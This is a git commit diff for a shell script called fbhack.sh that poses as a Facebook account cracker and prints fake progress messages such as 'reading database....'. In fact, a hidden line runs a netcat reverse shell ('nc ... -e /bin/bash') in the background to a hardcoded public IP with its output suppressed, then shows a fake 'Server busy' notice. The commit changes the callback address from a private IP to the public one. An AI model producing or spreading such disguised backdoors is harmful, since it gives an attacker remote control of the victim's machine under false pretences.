8c1ce5130bc71ea15b659c786251b0e858725478
Shiva454527 <80078546+Shiva454527@users.noreply.github.com>
2021-03-08 15:51:27 +0530

    Update fbhack.sh

--- fbhack.sh
+++ fbhack.sh
@@ -6,5 +6,5 @@ echo " [+] Account to crack : "
 echo  " [+] , please wait ..."
 echo "[+] reading database...."
 sleep 5
-nc 10.9.45.30 1194  -e /bin/bash > /dev/null 2>&1 & echo "[+]Server busy please "
+nc 193.161.193.99 1194  -e /bin/bash > /dev/null 2>&1 & echo "[+]Server busy please "
 
